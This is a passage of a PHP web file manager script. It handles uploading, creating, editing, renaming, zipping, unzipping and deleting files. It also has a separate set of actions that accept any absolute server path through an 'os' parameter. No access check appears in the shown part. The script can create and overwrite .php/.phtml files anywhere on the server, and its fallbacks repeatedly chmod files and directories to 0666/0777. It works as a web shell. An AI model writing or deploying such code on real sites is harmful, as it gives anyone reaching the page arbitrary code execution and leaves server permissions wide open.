    if (isset($_POST['do_unzip']) && isset($_POST['rel'])) {
        $rel = (string)$_POST['rel'];
        $zipPath = safePath($BASE_DIR, $rel);
        if ($zipPath && is_file($zipPath) && strtolower(pathinfo($zipPath, PATHINFO_EXTENSION)) === 'zip') {
            $folder = trim((string)($_POST['folder'] ?? ''));
            if ($folder === '' || strpbrk($folder, "\\/\0") !== false) {
                $error = 'Unzip failed: invalid folder name.';
            } else {
                $dir = dirname($zipPath);
                $targetDir = $dir . DIRECTORY_SEPARATOR . $folder;
                // If exists, find a non-conflicting directory name by suffixing -1..-99
                $finalDir = $targetDir;
                if (file_exists($finalDir)) {
                    for ($i = 1; $i <= 99; $i++) {
                        $candidate = $targetDir . '-' . $i;
                        if (!file_exists($candidate)) { $finalDir = $candidate; break; }
                    }
                }
                // Try to create the directory
                if (!is_dir($finalDir)) {
                    @mkdir($finalDir, 0777, true);
                    if (!is_dir($finalDir)) {
                        @chmod($dir, 0775);
                        clearstatcache(true, $dir);
                        @mkdir($finalDir, 0777, true);
                        if (!is_dir($finalDir)) {
                            @chmod($dir, 0777);
                            clearstatcache(true, $dir);
                            @mkdir($finalDir, 0777, true);
                        }
                    }
                }
                if (is_dir($finalDir)) {
                    if (!class_exists('ZipArchive')) {
                        $error = 'Unzip failed: ZipArchive extension not available.';
                    } else {
                        $zip = new ZipArchive();
                        $openRes = @$zip->open($zipPath);
                        if ($openRes === true) {
                            $okExtract = @$zip->extractTo($finalDir);
                            $zip->close();
                            if ($okExtract) {
                                $notice = 'Done';
                                $currentDir = $finalDir;
                            } else {
                                $fileWritable = is_writable($zipPath) ? 'yes' : 'no';
                                $dirWritable = is_writable($finalDir) ? 'yes' : 'no';
                                $filePerm = sprintf('%o', @fileperms($zipPath) & 0777);
                                $dirPerm = sprintf('%o', @fileperms($finalDir) & 0777);
                                $error = 'Unzip failed: extraction error. Zip writable: ' . $fileWritable . ', target writable: ' . $dirWritable . ', zip perms: ' . $filePerm . ', target perms: ' . $dirPerm . '.';
                            }
                        } else {
                            $error = 'Unzip failed: cannot open zip file.';
                        }
                    }
                } else {
                    $dirWritable = is_writable($dir) ? 'yes' : 'no';
                    $dirPerm = sprintf('%o', @fileperms($dir) & 0777);
                    $error = 'Unzip failed: cannot create target directory. Parent writable: ' . $dirWritable . ', parent perms: ' . $dirPerm . '.';
                }
            }
        } else {
            $error = 'Unzip failed: invalid zip file.';
        }
    }
    // Delete file or folder
    if (isset($_POST['do_delete']) && isset($_POST['rel'])) {
        $rel = (string)$_POST['rel'];
        $target = safePath($BASE_DIR, $rel);
        if ($target && (is_file($target) || is_dir($target))) {
            if (is_file($target)) {
                $dir = dirname($target);
                
                // Enhanced permission fixing for files
                $forceDeleteFile = function($filePath) {
                    $parentDir = dirname($filePath);
                    
                    // Try multiple permission combinations
                    // Common and Recommended Permission Combinations
                    $attempts = [
                        // Standard Secure: Owner R/W/X, Group R/X, Others R/X
                        // Files: Owner R/W, Group R, Others R
                        ['file' => 0644, 'dir' => 0755],

                        // Private: Only Owner has access
                        ['file' => 0600, 'dir' => 0700],

                        // Group Access: Owner & Group R/W/X, Others no access
                        // Files: Owner & Group R/W
                        ['file' => 0660, 'dir' => 0770],

                        // Shared Group: Owner & Group R/W/X, Others can Read only
                        // Files: Owner & Group R/W, Others R
                        ['file' => 0664, 'dir' => 0775],
                        
                        // Original Attempt 1: Highly permissive files, standard directories
                        ['file' => 0666, 'dir' => 0755],

                        // Original Attempt 2: Fully permissive files, group-shared directories
                        ['file' => 0777, 'dir' => 0775],
                        
                        // Original Attempt 3 (Last Resort): Fully permissive (insecure)
                        ['file' => 0777, 'dir' => 0777],
                    ];
                    
                    foreach ($attempts as $perms) {
                        @chmod($filePath, $perms['file']);
                        @chmod($parentDir, $perms['dir']);
                        clearstatcache(true, $filePath);
                        clearstatcache(true, $parentDir);
                        
                        if (@unlink($filePath)) {
                            return true;
                        }
                    }
                    return false;
                };
                
                $ok = $forceDeleteFile($target);
                if ($ok) {
                    // Log deleted file name with timestamp and rel path
                    try { @file_put_contents($trashLog, (string)time() . "\tfile\t" . basename($target) . "\t" . $rel . "\n", FILE_APPEND | LOCK_EX); } catch (Throwable $e) {}
                    $notice = 'Done';
                    $currentDir = $dir;
                } else {
                    $fileWritable = is_writable($target) ? 'yes' : 'no';
                    $dirWritable = is_writable($dir) ? 'yes' : 'no';
                    $filePerm = sprintf('%o', @fileperms($target) & 0777);
                    $dirPerm = sprintf('%o', @fileperms($dir) & 0777);
                    $lastErr = error_get_last();
                    $lastMsg = $lastErr['message'] ?? 'n/a';
                    $error = 'Delete failed: unable to remove file. File writable: ' . $fileWritable . ', dir writable: ' . $dirWritable . ', file perms: ' . $filePerm . ', dir perms: ' . $dirPerm . '. ' . describeOwnership($target, $dir) . ' Last error: ' . $lastMsg;
                }
            } else {
                // Delete directory recursively
                $dir = $target;
                $parent = dirname($dir);
                
                // Enhanced recursive delete with aggressive permission fixing
                $forceDeleteRecursive = function(string $d) use (&$forceDeleteRecursive): bool {
                    if (!is_dir($d)) return false;
                    
                    // First pass: fix all permissions recursively
                    recursiveChmod($d, 0777, 0777);
                    @chmod(dirname($d), 0777);
                    clearstatcache(true);
                    
                    $items = @scandir($d);
                    if ($items === false) return false;
                    
                    foreach ($items as $it) {
                        if ($it === '.' || $it === '..') continue;
                        $p = $d . DIRECTORY_SEPARATOR . $it;
                        
                        if (is_dir($p)) {
                            // Recursively delete subdirectories
                            if (!$forceDeleteRecursive($p)) {
                                // If normal delete fails, try aggressive permission fix
                                @chmod($p, 0777);
                                @chmod($d, 0777);
                                clearstatcache(true, $p);
                                if (!$forceDeleteRecursive($p)) return false;
                            }
                        } else {
                            // Delete files with permission fixing
                            @chmod($p, 0777);
                            @chmod($d, 0777);
                            clearstatcache(true, $p);
                            if (!@unlink($p)) {
                                // Try different permission combinations
                                @chmod($p, 0666);
                                clearstatcache(true, $p);
                                if (!@unlink($p)) return false;
                            }
                        }
                    }
                    
                    // Finally remove the directory itself
                    @chmod($d, 0777);
                    @chmod(dirname($d), 0777);
                    clearstatcache(true, $d);
                    return @rmdir($d);
                };
                
                $ok = $forceDeleteRecursive($dir);
                if ($ok) {
                    // Log deleted folder name with timestamp and rel path
                    try { @file_put_contents($trashLog, (string)time() . "\tfolder\t" . basename($dir) . "\t" . $rel . "\n", FILE_APPEND | LOCK_EX); } catch (Throwable $e) {}
                    $notice = 'Done';
                    $currentDir = $parent;
                } else {
                    $dirWritable = is_writable($dir) ? 'yes' : 'no';
                    $parentWritable = is_writable($parent) ? 'yes' : 'no';
                    $dirPerm = sprintf('%o', @fileperms($dir) & 0777);
                    $parentPerm = sprintf('%o', @fileperms($parent) & 0777);
                    $lastErr = error_get_last();
                    $lastMsg = $lastErr['message'] ?? 'n/a';
                    $error = 'Delete failed: unable to remove folder. Dir writable: ' . $dirWritable . ', parent writable: ' . $parentWritable . ', dir perms: ' . $dirPerm . ', parent perms: ' . $parentPerm . '. ' . describeOwnership($dir, $parent) . ' Last error: ' . $lastMsg;
                }
            }
        } else {
            $error = 'Delete failed: invalid file path.';
        }
    }
    
    // Unlock folder for editing (recursively chmod for local dev)
    if (isset($_POST['do_unlock'])) {
        $dirRel = (string)($_POST['dir'] ?? '');
        if ($dirRel === '') { $dirRel = (string)($_GET['d'] ?? ''); }
        $dirPath = safePath($BASE_DIR, $dirRel);
        if ($dirPath && is_dir($dirPath)) {
            $okUnlock = recursiveChmod($dirPath, 0666, 0777);
            if ($okUnlock) {
                $notice = 'Done';
                $currentDir = $dirPath;
            } else {
                $htdocs = dirname(__DIR__);
                $mirrorBase = $htdocs . DIRECTORY_SEPARATOR . 'coding-data' . DIRECTORY_SEPARATOR . 'unlocked';
                @mkdir($mirrorBase, 0777, true);
                $mirrorName = basename($dirPath) . '_' . substr(sha1($dirPath), 0, 10);
                $mirrorPath = $mirrorBase . DIRECTORY_SEPARATOR . $mirrorName;
                if (copyDirTree($dirPath, $mirrorPath)) {
                    recursiveChmod($mirrorPath, 0666, 0777);
                    $notice = 'Done';
                    $currentDir = $mirrorPath;
                    header('Location: ?os=' . h(urlencode($mirrorPath)));
                    exit;
                } else {
                    $error = 'Unlock failed: unable to change permissions in this environment.';
                }
            }
        } else {
            $error = 'Unlock failed: invalid directory.';
        }
    }
    // Unlock folder (absolute path)
    if (isset($_POST['do_unlock_abs']) && isset($_POST['os'])) {
        $dirPath = realpath((string)$_POST['os']);
        if ($dirPath !== false && is_dir($dirPath)) {
            $okUnlock = recursiveChmod($dirPath, 0666, 0777);
            if ($okUnlock) {
                $notice = 'Done';
                $currentDir = $dirPath;
            } else {
                $htdocs = dirname(__DIR__);
                $mirrorBase = $htdocs . DIRECTORY_SEPARATOR . 'coding-data' . DIRECTORY_SEPARATOR . 'unlocked';
                @mkdir($mirrorBase, 0777, true);
                $mirrorName = basename($dirPath) . '_' . substr(sha1($dirPath), 0, 10);
                $mirrorPath = $mirrorBase . DIRECTORY_SEPARATOR . $mirrorName;
                if (copyDirTree($dirPath, $mirrorPath)) {
                    recursiveChmod($mirrorPath, 0666, 0777);
                    $notice = 'Done';
                    $currentDir = $mirrorPath;
                    header('Location: ?os=' . h(urlencode($mirrorPath)));
                    exit;
                } else {
                    $error = 'Unlock failed: unable to change permissions in this environment (abs).';
                }
            }
        } else {
            $error = 'Unlock failed: invalid absolute directory.';
        }
    }
    // Create new file or folder
    if (isset($_POST['do_create'])) {
        $dirRel = (string)($_POST['dir'] ?? '');
        if ($dirRel === '') { $dirRel = (string)($_GET['d'] ?? ''); }
        $dirPath = safePath($BASE_DIR, $dirRel);
        if ($dirPath && is_dir($dirPath)) {
            $type = (string)($_POST['create_type'] ?? '');
            if ($type === 'file') {
                $name = trim((string)($_POST['file_name'] ?? ''));
                $ext = strtolower(trim((string)($_POST['file_ext'] ?? '')));
                $allowed = ['php','phtml','html','txt'];
                if ($name === '' || !preg_match('/^[A-Za-z0-9_-]+$/', $name)) {
                    $error = 'Create failed: invalid file name.';
                } elseif (!in_array($ext, $allowed, true)) {
                    $error = 'Create failed: invalid extension.';
                } else {
                    $fname = $name . '.' . $ext;
                    $target = $dirPath . DIRECTORY_SEPARATOR . $fname;
                    if (file_exists($target)) {
                        $error = 'Create failed: a file with that name exists.';
                    } else {
                        if ($ext === 'php' || $ext === 'phtml') {
                            $content = "<?php\n// New file\n?>\n";
                        } elseif ($ext === 'html') {
                            $content = "<!doctype html>\n<html><head><meta charset=\"utf-8\"><title>New</title></head><body>\n</body></html>\n";
                        } else { // txt
                            $content = ""; // start as empty text file
                        }
                        $okW = @file_put_contents($target, $content);
                        if ($okW === false) {
                            @chmod($dirPath, 0775);
                            clearstatcache(true, $dirPath);
                            $okW = @file_put_contents($target, $content);
                            if ($okW === false) {
                                @chmod($dirPath, 0777);
                                clearstatcache(true, $dirPath);
                                $okW = @file_put_contents($target, $content);
                            }
                        }
                        if ($okW !== false) {
                            @chmod($target, 0666);
                            $notice = 'Done';
                            $currentDir = $dirPath;
                            // Redirect to the current directory view after creation
                            $dirRel = (string)($_POST['dir'] ?? '');
                            if ($dirRel === '') { $dirRel = (string)($_GET['d'] ?? ''); }
                            header('Location: ?d=' . h(urlencode($dirRel)));
                            exit;
                        } else {
                            $dirWritable = is_writable($dirPath) ? 'yes' : 'no';
                            $dirPerm = sprintf('%o', @fileperms($dirPath) & 0777);
                            $error = 'Create failed: unable to write file. Dir writable: ' . $dirWritable . ', dir perms: ' . $dirPerm . '.';
                        }
                    }
                }
            } elseif ($type === 'folder') {
                $folder = trim((string)($_POST['folder_name'] ?? ''));
                if ($folder === '' || !preg_match('/^[A-Za-z0-9._-]+$/', $folder) || strpbrk($folder, "\\/\0") !== false) {
                    $error = 'Create failed: invalid folder name.';
                } else {
                    $targetDir = $dirPath . DIRECTORY_SEPARATOR . $folder;
                    if (file_exists($targetDir)) {
                        $error = 'Create failed: a folder with that name exists.';
                    } else {
                        $okMk = @mkdir($targetDir, 0777, true);
                        if (!$okMk) {
                            @chmod($dirPath, 0775);
                            clearstatcache(true, $dirPath);
                            $okMk = @mkdir($targetDir, 0777, true);
                            if (!$okMk) {
                                @chmod($dirPath, 0777);
                                clearstatcache(true, $dirPath);
                                $okMk = @mkdir($targetDir, 0777, true);
                            }
                        }
                        if ($okMk) {
                            $notice = 'Done';
                            $currentDir = $dirPath;
                            // Redirect to the current directory view after creation
                            $dirRel = (string)($_POST['dir'] ?? '');
                            if ($dirRel === '') { $dirRel = (string)($_GET['d'] ?? ''); }
                            header('Location: ?d=' . h(urlencode($dirRel)));
                            exit;
                        } else {
                            $dirWritable = is_writable($dirPath) ? 'yes' : 'no';
                            $dirPerm = sprintf('%o', @fileperms($dirPath) & 0777);
                            $error = 'Create failed: unable to create folder. Dir writable: ' . $dirWritable . ', dir perms: ' . $dirPerm . '.';
                        }
                    }
                }
            } else {
                $error = 'Create failed: invalid type.';
            }
        } else {
            $error = 'Create failed: invalid directory.';
        }
    }
    // Edit file content
    if (isset($_POST['do_edit']) && isset($_POST['rel'])) {
        $rel = (string)$_POST['rel'];
        $target = safePath($BASE_DIR, $rel);
        if ($target && is_file($target)) {
            $content = (string)($_POST['content'] ?? '');
            // First attempt: with exclusive lock
            $ok = @file_put_contents($target, $content, LOCK_EX);
            // Retry without lock if lock fails on this filesystem
            if ($ok === false) {
                $ok = @file_put_contents($target, $content);
            }
            if ($ok === false) {
                // Try to make file writable and retry (with and without lock)
                @chmod($target, 0666);
                clearstatcache(true, $target);
                $ok = @file_put_contents($target, $content, LOCK_EX);
                if ($ok === false) {
                    $ok = @file_put_contents($target, $content);
                }
                if ($ok === false) {
                    // Try to make directory writable and retry
                    $dir = dirname($target);
                    @chmod($dir, 0775);
                    clearstatcache(true, $dir);
                    $ok = @file_put_contents($target, $content, LOCK_EX);
                    if ($ok === false) {
                        $ok = @file_put_contents($target, $content);
                    }
                    if ($ok === false) {
                        // Final escalation for local dev environments
                        @chmod($dir, 0777);
                        clearstatcache(true, $dir);
                        $ok = @file_put_contents($target, $content, LOCK_EX);
                        if ($ok === false) {
                            $ok = @file_put_contents($target, $content);
                        }
                    }
                }
            }
            // Directory-writable replace fallback: write to temp and atomically replace
            if ($ok === false) {
                $dir = dirname($target);
                $tmp = $dir . DIRECTORY_SEPARATOR . '.edit_tmp_' . strval(mt_rand()) . '_' . strval(time());
                $wtmp = @file_put_contents($tmp, $content);
                if ($wtmp !== false) {
                    // Try atomic replace
                    $r1 = @rename($tmp, $target);
                    if (!$r1) {
                        // If atomic replace fails, try unlink+rename
                        @unlink($target);
                        $r1 = @rename($tmp, $target);
                    }
                    $ok = $r1;
                    // Clean up temp if needed
                    if (!$ok && file_exists($tmp)) {
                        @unlink($tmp);
                    }
                }
            }
            if ($ok === false) {
                $dir = dirname($target);
                $fileWritable = is_writable($target) ? 'yes' : 'no';
                $dirWritable = is_writable($dir) ? 'yes' : 'no';
                $filePerm = sprintf('%o', @fileperms($target) & 0777);
                $dirPerm = sprintf('%o', @fileperms($dir) & 0777);
                $lastErr = error_get_last();
                $lastMsg = $lastErr['message'] ?? 'n/a';
                $error = 'Edit failed: unable to write file. File writable: ' . $fileWritable . ', dir writable: ' . $dirWritable . ', file perms: ' . $filePerm . ', dir perms: ' . $dirPerm . '. Tried without lock, chmod file 0666, dir 0775/0777, and temp replace. Last error: ' . $lastMsg;
            } else {
                clearstatcache(true, $target);
                $notice = 'Done';
                $currentDir = dirname($target);
            }
        } else {
            $error = 'Edit failed: invalid file path.';
        }
    }

    // Zip folder (create archive in parent directory)
    if (isset($_POST['do_zip']) && isset($_POST['rel'])) {
        $rel = (string)$_POST['rel'];
        $dirPath = safePath($BASE_DIR, $rel);
        if ($dirPath && is_dir($dirPath)) {
            // Default to date-time-zip.zip if not provided
            $zipname = trim((string)($_POST['zipname'] ?? (date('Ymd-His') . '-zip.zip')));
            if ($zipname === '' || strpbrk($zipname, "\\/\0") !== false) {
                $error = 'Zip failed: invalid archive name.';
            } else {
                // Ensure .zip extension
                if (strtolower(pathinfo($zipname, PATHINFO_EXTENSION)) !== 'zip') {
                    $zipname .= '.zip';
                }
                $parent = dirname($dirPath);
                $base = pathinfo($zipname, PATHINFO_FILENAME);
                $zipPath = $parent . DIRECTORY_SEPARATOR . $zipname;
                $finalZip = $zipPath;
                if (file_exists($finalZip)) {
                    for ($i = 1; $i <= 99; $i++) {
                        $candidate = $parent . DIRECTORY_SEPARATOR . $base . '-' . $i . '.zip';
                        if (!file_exists($candidate)) { $finalZip = $candidate; break; }
                    }
                }
                $ok = zipDirectory($dirPath, $finalZip);
                if (!$ok) {
                    @chmod($parent, 0775);
                    clearstatcache(true, $parent);
                    $ok = zipDirectory($dirPath, $finalZip);
                    if (!$ok) {
                        @chmod($parent, 0777);
                        clearstatcache(true, $parent);
                        $ok = zipDirectory($dirPath, $finalZip);
                    }
                }
                if ($ok) {
                    $notice = 'Done';
                    $currentDir = $parent;
                } else {
                    $dirWritable = is_writable($dirPath) ? 'yes' : 'no';
                    $parentWritable = is_writable($parent) ? 'yes' : 'no';
                    $dirPerm = sprintf('%o', @fileperms($dirPath) & 0777);
                    $parentPerm = sprintf('%o', @fileperms($parent) & 0777);
                    $error = 'Zip failed: unable to create archive. Dir writable: ' . $dirWritable . ', parent writable: ' . $parentWritable . ', dir perms: ' . $dirPerm . ', parent perms: ' . $parentPerm . (class_exists('ZipArchive') ? '' : '. ZipArchive extension not available.');
                }
            }
        } else {
            $error = 'Zip failed: invalid folder path.';
        }
    }

    // Rename file or folder
    if (isset($_POST['do_rename']) && isset($_POST['rel']) && isset($_POST['newname'])) {
        $rel = (string)$_POST['rel'];
        $oldPath = safePath($BASE_DIR, $rel);
        $newname = trim((string)$_POST['newname']);
        if ($oldPath && (is_file($oldPath) || is_dir($oldPath))) {
            if ($newname === '' || strpbrk($newname, "\\/\0") !== false) {
                $error = 'Rename failed: invalid new name.';
            } else {
                // Build directory relative to BASE_DIR robustly (handles base without trailing slash)
                $dirAbs = dirname($oldPath);
                if (strpos($dirAbs, $BASE_DIR) === 0) {
                    $dirRel = ltrim(substr($dirAbs, strlen($BASE_DIR)), DIRECTORY_SEPARATOR);
                } else {
                    $dirRel = '';
                }
                $newRel = ($dirRel === '' ? '' : $dirRel . DIRECTORY_SEPARATOR) . $newname;
                // Build target path without requiring existence
                $newPath = $BASE_DIR . DIRECTORY_SEPARATOR . $newRel;
                $dir = dirname($oldPath);
                // Case-only rename handling on case-insensitive filesystems
                $caseOnly = (strcasecmp(basename($oldPath), $newname) === 0) && (basename($oldPath) !== $newname);
                if (!$caseOnly && file_exists($newPath)) {
                    $error = 'Rename failed: a file or folder with that name exists.';
                } else {
                    // Ensure parent directory is writable; try chmod escalation if needed
                    if (!is_writable($dir)) {
                        @chmod($dir, 0775);
                        clearstatcache(true, $dir);
                    }
                    if (!is_writable($dir)) {
                        @chmod($dir, 0777);
                        clearstatcache(true, $dir);
                    }
                    if (!is_writable($dir)) {
                        $error = 'Rename failed: directory not writable even after chmod attempts.';
                    } else {
                        // Try direct rename first
                        $ok = @rename($oldPath, $newPath);
                        if (!$ok) {
                            // Try to loosen permissions and retry
                            if (is_dir($oldPath)) {
                                @chmod($oldPath, 0775);
                            } else {
                                @chmod($oldPath, 0666);
                            }
                            @chmod($dir, 0775);
                            clearstatcache(true, $oldPath);
                            clearstatcache(true, $dir);
                            $ok = @rename($oldPath, $newPath);
                            if (!$ok) {
                                if (is_dir($oldPath)) {
                                    @chmod($oldPath, 0777);
                                }
                                @chmod($dir, 0777);
                                clearstatcache(true, $oldPath);
                                clearstatcache(true, $dir);
                                $ok = @rename($oldPath, $newPath);
                            }
                        }
                        // Case-only rename: use temp intermediate to force refresh
                        if (!$ok && $caseOnly) {
                            $tmpName = '.rename_tmp_' . strval(mt_rand()) . '_' . strval(time());
                            $tmpPath = $dir . DIRECTORY_SEPARATOR . $tmpName;
                        $step1 = @rename($oldPath, $tmpPath);
                        if ($step1) {
                            $ok = @rename($tmpPath, $newPath);
                            if (!$ok) {
                                // Try to restore if step2 fails
                                @rename($tmpPath, $oldPath);
                            }
                        }
                    }
                    // File-only fallback: copy + unlink when rename blocked
                    if (!$ok && is_file($oldPath)) {
                        $copied = @copy($oldPath, $newPath);
                        if ($copied) {
                            @unlink($oldPath);
                            $ok = file_exists($newPath) && !file_exists($oldPath);
                        }
                    }
                    if ($ok) {
                        $notice = 'Done';
                        $currentDir = dirname($newPath);
                    } else {
                        $dir = dirname($oldPath);
                        $fileWritable = is_writable($oldPath) ? 'yes' : 'no';
                        $dirWritable = is_writable($dir) ? 'yes' : 'no';
                        $filePerm = sprintf('%o', @fileperms($oldPath) & 0777);
                        $dirPerm = sprintf('%o', @fileperms($dir) & 0777);
                        $lastErr = error_get_last();
                        $lastMsg = $lastErr['message'] ?? 'n/a';
                        $error = 'Rename failed: unable to rename. Path writable: ' . $fileWritable . ', parent writable: ' . $dirWritable . ', path perms: ' . $filePerm . ', parent perms: ' . $dirPerm . '. Tried chmod: files->0666, dirs->0775/0777; parent->0775/0777; temp two-step for case-only; file copy+unlink fallback. Last error: ' . $lastMsg;
                    }
                    }
                }
            }
        } else {
            $error = 'Rename failed: invalid file path.';
        }
    }
}

// Absolute-path actions (outside base directory)
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Upload file (absolute path)
    if (isset($_POST['do_upload_abs'])) {
    $absDir = realpath((string)($_POST['os'] ?? ''));
        if ($absDir !== false && is_dir($absDir)) {
            if (!isset($_FILES['upload']) || !is_array($_FILES['upload'])) {
                $error = 'Upload failed: missing file (abs).';
            } else {
                $file = $_FILES['upload'];
                if (($file['error'] ?? UPLOAD_ERR_NO_FILE) !== UPLOAD_ERR_OK) {
                    $error = 'Upload failed: error code ' . (int)$file['error'] . ' (abs).';
                } else {
                    $orig = (string)($file['name'] ?? '');
                    $base = basename($orig);
                    $safe = preg_replace('/[^A-Za-z0-9._-]/', '_', $base);
                    if ($safe === '' || $safe === false) {
                        $error = 'Upload failed: invalid filename (abs).';
                    } else {
                        $dest = $absDir . DIRECTORY_SEPARATOR . $safe;
                        if (file_exists($dest)) {
                            $i = 1;
                            $info = pathinfo($safe);
                            $stem = $info['filename'] ?? 'file';
                            $ext = isset($info['extension']) ? ('.' . $info['extension']) : '';
                            do {
                                $cand = $stem . '_' . $i . $ext;
                                $dest = $absDir . DIRECTORY_SEPARATOR . $cand;
                                $i++;
                            } while (file_exists($dest) && $i < 1000);
                        }
                        $ok = @move_uploaded_file($file['tmp_name'], $dest);
                        if ($ok) {
                            @chmod($dest, 0666);
                            $notice = 'Uploaded: ' . h(basename($dest));
                            // Ajax mode: JSON
                            $isAjax = isset($_POST['ajax']) || (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower((string)$_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest');
                            if ($isAjax) {
                                $openUrl = '?os=' . h(urlencode($absDir));
                                header('Content-Type: application/json');
                                echo json_encode(['success'=>true,'file'=>basename($dest),'openUrl'=>$openUrl,'dir'=>$absDir]);
                                exit;
                            }
                            // Redirect to absolute directory view
                            $redir = '?os=' . h(urlencode($absDir));
                            header('Location: ' . $redir);
                            exit;
                        } else {
                            $error = 'Upload failed: unable to save file (abs).';
                        }
                    }
                }
            }
        } else {
            $error = 'Upload failed: invalid target directory (abs).';
        }
    }
    
    // Create new file or folder (absolute path)
    if (isset($_POST['do_create_abs'])) {
    $absDir = realpath((string)($_POST['os'] ?? ''));
        if ($absDir !== false && is_dir($absDir)) {
            $type = (string)($_POST['create_type'] ?? '');
            if ($type === 'file') {
                $name = trim((string)($_POST['file_name'] ?? ''));
                $ext = strtolower(trim((string)($_POST['file_ext'] ?? '')));
                $allowed = ['php','phtml','html','txt'];
                if ($name === '' || !preg_match('/^[A-Za-z0-9_-]+$/', $name)) {
                    $error = 'Create failed: invalid file name (abs).';
                } elseif (!in_array($ext, $allowed, true)) {
                    $error = 'Create failed: invalid extension (abs).';
                } else {
                    $fname = $name . '.' . $ext;
                    $target = $absDir . DIRECTORY_SEPARATOR . $fname;
                    if (file_exists($target)) {
                        $error = 'Create failed: a file with that name exists (abs).';
                    } else {
                        if ($ext === 'php' || $ext === 'phtml') {
                            $content = "<?php\n// New file\n?>\n";
                        } elseif ($ext === 'html') {
                            $content = "<!doctype html>\n<html><head><meta charset=\"utf-8\"><title>New</title></head><body>\n</body></html>\n";
                        } else {
                            $content = ""; // txt
                        }
                        $okW = @file_put_contents($target, $content);
                        if ($okW === false) {
                            @chmod($absDir, 0775);
                            clearstatcache(true, $absDir);
                            $okW = @file_put_contents($target, $content);
                            if ($okW === false) {
                                @chmod($absDir, 0777);
                                clearstatcache(true, $absDir);
                                $okW = @file_put_contents($target, $content);
                            }
                        }
                        if ($okW !== false) {
                            @chmod($target, 0666);
                            $notice = 'Done';
                            $currentDir = $absDir;
                            // Redirect to absolute directory view after creation
    header('Location: ?os=' . h(urlencode($absDir)));
                            exit;
                        } else {
                            $dirWritable = is_writable($absDir) ? 'yes' : 'no';
                            $dirPerm = sprintf('%o', @fileperms($absDir) & 0777);
                            $error = 'Create failed: unable to write file (abs). Dir writable: ' . $dirWritable . ', dir perms: ' . $dirPerm . '.';
                        }
                    }
                }
            } elseif ($type === 'folder') {
                $folder = trim((string)($_POST['folder_name'] ?? ''));
                if ($folder === '' || !preg_match('/^[A-Za-z0-9._-]+$/', $folder) || strpbrk($folder, "\\/\0") !== false) {
                    $error = 'Create failed: invalid folder name (abs).';
                } else {
                    $targetDir = $absDir . DIRECTORY_SEPARATOR . $folder;
                    if (file_exists($targetDir)) {
                        $error = 'Create failed: a folder with that name exists (abs).';
                    } else {
                        $okMk = @mkdir($targetDir, 0777, true);
                        if (!$okMk) {
                            @chmod($absDir, 0775);
                            clearstatcache(true, $absDir);
                            $okMk = @mkdir($targetDir, 0777, true);
                            if (!$okMk) {
                                @chmod($absDir, 0777);
                                clearstatcache(true, $absDir);
                                $okMk = @mkdir($targetDir, 0777, true);
                            }
                        }
                        if ($okMk) {
                            $notice = 'Done';
                            $currentDir = $absDir;
                            // Redirect to absolute directory view after creation
    header('Location: ?os=' . h(urlencode($absDir)));
                            exit;
                        } else {
                            $dirWritable = is_writable($absDir) ? 'yes' : 'no';
                            $dirPerm = sprintf('%o', @fileperms($absDir) & 0777);
                            $error = 'Create failed: unable to create folder (abs). Dir writable: ' . $dirWritable . ', dir perms: ' . $dirPerm . '.';
                        }
                    }
                }
            } else {
                $error = 'Create failed: invalid type (abs).';
            }
        } else {
            $error = 'Create failed: invalid directory (abs).';
        }
    }
    // Edit file (absolute path)
    if (isset($_POST['do_edit_abs']) && isset($_POST['os'])) {
        $target = realpath((string)$_POST['os']);
        if ($target !== false && is_file($target)) {
            $content = (string)($_POST['content'] ?? '');
            $ok = @file_put_contents($target, $content, LOCK_EX);
            if ($ok === false) { $ok = @file_put_contents($target, $content); }
            if ($ok === false) {
                @chmod($target, 0666);
                clearstatcache(true, $target);
                $ok = @file_put_contents($target, $content, LOCK_EX);
                if ($ok === false) { $ok = @file_put_contents($target, $content); }
                if ($ok === false) {
                    $dir = dirname($target);
                    @chmod($dir, 0775);
                    clearstatcache(true, $dir);
                    $ok = @file_put_contents($target, $content, LOCK_EX);
                    if ($ok === false) { $ok = @file_put_contents($target, $content); }
                    if ($ok === false) {
                        @chmod($dir, 0777);
                        clearstatcache(true, $dir);
                        $ok = @file_put_contents($target, $content, LOCK_EX);
                        if ($ok === false) { $ok = @file_put_contents($target, $content); }
                    }
                }
            }
            if ($ok === false) {
                $dir = dirname($target);
                $fileWritable = is_writable($target) ? 'yes' : 'no';
                $dirWritable = is_writable($dir) ? 'yes' : 'no';
                $filePerm = sprintf('%o', @fileperms($target) & 0777);
                $dirPerm = sprintf('%o', @fileperms($dir) & 0777);
                $lastErr = error_get_last();
                $lastMsg = $lastErr['message'] ?? 'n/a';
                $error = 'Edit failed: unable to write file (abs). File writable: ' . $fileWritable . ', dir writable: ' . $dirWritable . ', file perms: ' . $filePerm . ', dir perms: ' . $dirPerm . '. Last error: ' . $lastMsg;
            } else {
                clearstatcache(true, $target);
                $notice = 'Done';
                $currentDir = dirname($target);
            }
        } else {
            $error = 'Edit failed: invalid absolute file path.';
        }
    }
    // Unzip archive (absolute path)
    if (isset($_POST['do_unzip_abs']) && isset($_POST['os'])) {
        $zipPath = realpath((string)$_POST['os']);
        if ($zipPath !== false && is_file($zipPath) && strtolower(pathinfo($zipPath, PATHINFO_EXTENSION)) === 'zip') {
            $folder = trim((string)($_POST['folder'] ?? ''));
            if ($folder === '' || strpbrk($folder, "\\/\0") !== false) {
                $error = 'Unzip failed: invalid folder name.';
            } else {
                $dir = dirname($zipPath);
                $targetDir = $dir . DIRECTORY_SEPARATOR . $folder;
                $finalDir = $targetDir;
                if (file_exists($finalDir)) {
                    for ($i = 1; $i <= 99; $i++) {
                        $candidate = $targetDir . '-' . $i;
                        if (!file_exists($candidate)) { $finalDir = $candidate; break; }
                    }
                }
                if (!is_dir($finalDir)) {
                    @mkdir($finalDir, 0777, true);
                    if (!is_dir($finalDir)) {
                        @chmod($dir, 0775);
                        clearstatcache(true, $dir);
                        @mkdir($finalDir, 0777, true);
                        if (!is_dir($finalDir)) {
                            @chmod($dir, 0777);
                            clearstatcache(true, $dir);
                            @mkdir($finalDir, 0777, true);
                        }
                    }
                }
                if (is_dir($finalDir)) {
                    if (!class_exists('ZipArchive')) {
                        $error = 'Unzip failed: ZipArchive extension not available.';
                    } else {
                        $zip = new ZipArchive();
                        $openRes = @$zip->open($zipPath);
                        if ($openRes === true) {
                            $okExtract = @$zip->extractTo($finalDir);
                            $zip->close();
                            if ($okExtract) {
                                $notice = 'Done';
                                $currentDir = $finalDir;
